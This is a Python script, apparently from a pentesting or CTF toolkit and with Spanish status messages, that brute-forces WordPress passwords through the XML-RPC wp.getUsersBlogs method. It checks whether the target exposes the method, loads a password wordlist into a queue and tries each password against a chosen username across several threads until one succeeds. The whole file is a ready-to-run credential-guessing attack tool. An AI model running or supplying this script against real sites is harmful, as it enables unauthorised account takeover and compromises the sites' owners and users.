#!/usr/bin/python3
import sys, threading, queue, signal, argparse
import xmlrpc.client as xml
from time import sleep
from pwn import log
PYTHONIOENCODING='latin-1'
parser=argparse.ArgumentParser()
parser.add_argument("-t", "--threads", help="Number of threads", type=int, required=True)
parser.add_argument("-u", "--url", help="Url target", required=True)
parser.add_argument("-w", '--wordlist', help="Passwords wordlist", required=True)
parser.add_argument("-s", '--user', help="Username to bruteforce", required=True)
args=parser.parse_args()

#ctrl + c
def def_handler(sig, frame):
    print("\n\n[ * ] Saliendo...")
    exit(1)
signal.signal(signal.SIGINT, def_handler)

user=args.user
dictionary=args.wordlist
threads=args.threads
url=args.url
listMethods='<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'


getUserMethod='<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>pass</value></param></params></methodCall>'


connection = xml.ServerProxy(url)

def vulnCheck():
    try:
        listMethodsCall = connection._ServerProxy__request('system.listMethods',())
    except:
        print("Service unavailable or protocol error. Please, check the url")
        exit(1)

    if 'wp.getUsersBlogs' in listMethodsCall:
        print("Appears to be vulnerable...")
    else:
        print("Target is not vulnerable to wp.getUsersBlogs method bruteforcing")
        exit(0)



def dictLoad(dictionary):
    try:
        wordlistcon=open(dictionary, "r", encoding="latin-1")
    except FileNotFoundError:
        print("Dictionary not found")
        exit(1)
    else:
        wordlist=wordlistcon.readlines()
        words=queue.Queue()
        p2=log.progress("Cargando diccionario: ")
    for word in wordlist:
        word=word.rstrip()
        words.put(word)
        p2.status(str(words.qsize()))
    p2.success()
    return words


def bruter(Wqueue, user):
    p1=log.progress("current password:")
    while not Wqueue.empty():
        password=Wqueue.get()
        try:
            connection._ServerProxy__request('wp.getUsersBlogs', (user, password))
        except:
            p1.status(password)
            continue
        else:
            print('Password has been found: %s' % (password))
            exit(0)


def main(dictionary, threadsAmount, user):
    wordlistQueue=dictLoad(dictionary)
    for th in range(threadsAmount):
        t=threading.Thread(target=bruter, args=(wordlistQueue, user))
        t.start()
        sleep(0.5)
    

if __name__ == "__main__":
    vulnCheck()
    main(dictionary, threads, user)
